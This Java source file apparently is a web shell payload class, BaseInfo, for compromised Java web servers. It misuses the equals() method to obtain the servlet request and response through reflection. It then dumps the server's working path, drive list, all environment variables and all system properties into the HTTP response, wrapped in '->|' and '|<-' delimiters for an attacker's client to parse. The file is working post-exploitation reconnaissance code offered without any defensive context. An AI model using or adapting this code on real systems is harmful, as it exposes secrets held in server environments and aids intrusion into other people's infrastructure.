import java.io.File;
import java.lang.reflect.Field;
import java.util.Iterator;
import java.util.Map;
import java.util.Properties;
import java.util.Set;
import java.util.Map.Entry;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

public class BaseInfo {
    public HttpServletRequest request = null;
    public HttpServletResponse response = null;
    public String cs;

    public boolean equals(Object obj) {
        try {
            Class clazz = Class.forName("javax.servlet.jsp.PageContext");
            request = (HttpServletRequest) clazz.getDeclaredMethod("getRequest").invoke(obj);
            response = (HttpServletResponse) clazz.getDeclaredMethod("getResponse").invoke(obj);
        } catch (Exception ex) {
            if (obj instanceof HttpServletRequest) {
                request = (HttpServletRequest) obj;
                try {
                    Field req = request.getClass().getDeclaredField("request");
                    req.setAccessible(true);
                    HttpServletRequest request2 = (HttpServletRequest) req.get(request);
                    Field resp = request2.getClass().getDeclaredField("response");
                    resp.setAccessible(true);
                    response = (HttpServletResponse) resp.get(request2);
                } catch (Exception e) {
                    e.printStackTrace();
                }

            } else if (obj instanceof HttpServletResponse) {
                response = (HttpServletResponse) obj;
                try {
                    Field resp = response.getClass().getDeclaredField("response");
                    resp.setAccessible(true);
                    HttpServletResponse response2 = (HttpServletResponse) resp.get(response);
                    Field req = response2.getClass().getDeclaredField("request");
                    req.setAccessible(true);
                    request = (HttpServletRequest) req.get(response2);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }

        StringBuffer output = new StringBuffer("");
        StringBuffer sb = new StringBuffer("");
        cs = "UTF-8";
        String tag_s = "->|";
        String tag_e = "|<-";
        try {
            response.setContentType("text/html");
            request.setCharacterEncoding(cs);
            response.setCharacterEncoding(cs);
            output.append(tag_s);
            sb.append(getInfo());
            output.append(sb.toString());
            output.append(tag_e);
            response.getWriter().print(output.toString());
        } catch (Exception e) {
            e.printStackTrace();
        }

        return true;
    }

    public static void main(String[] args)  {
        BaseInfo baseInfo = new BaseInfo();
        System.out.println(baseInfo.getInfo());
    }
    public String getInfo()  {
        String result = "";
        StringBuilder baseInfo = new StringBuilder("");
        baseInfo.append("----------------currentPath----------------\n");
        String currentPath = (new File("")).getAbsolutePath();
        String driveList = "";
        File[] roots = File.listRoots();
        File[] var11 = roots;
        int var12 = roots.length;

        for(int var13 = 0; var13 < var12; ++var13) {
            File f = var11[var13];
            driveList = driveList + f.getPath() + ";";
        }
        baseInfo.append(currentPath+"\n");
        baseInfo.append("----------------driveList----------------\n");
        baseInfo.append(driveList+"\n");
        baseInfo.append("----------------System.env----------------\n");
        Map env = System.getenv();
        Iterator i = env.keySet().iterator();

        while(i.hasNext()) {
            String name = (String)i.next();
            baseInfo.append(name + "=" + env.get(name) + "\n");
        }
        baseInfo.append("----------------System.properties----------------\n");
        Properties props = System.getProperties();
        Set entrySet = props.entrySet();
        Iterator item = entrySet.iterator();

        while (item.hasNext()) {
            Entry entry = (Entry) item.next();
            baseInfo.append(entry.getKey() + " = " + entry.getValue() + "\n");
        }
        result=baseInfo.toString();

        return result;
    }
}
